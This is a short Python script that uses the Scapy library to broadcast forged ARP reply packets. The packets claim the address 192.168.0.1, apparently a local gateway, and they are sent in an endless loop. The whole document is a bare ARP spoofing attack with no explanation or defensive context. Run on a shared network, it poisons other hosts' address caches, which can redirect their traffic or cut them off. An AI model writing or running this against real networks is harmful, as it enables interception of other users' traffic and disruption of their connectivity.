from scapy.all import Ether, ARP, sendp

spoofed_ip = "192.168.0.1" 
packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=spoofed_ip)
while 1:
    sendp(packet)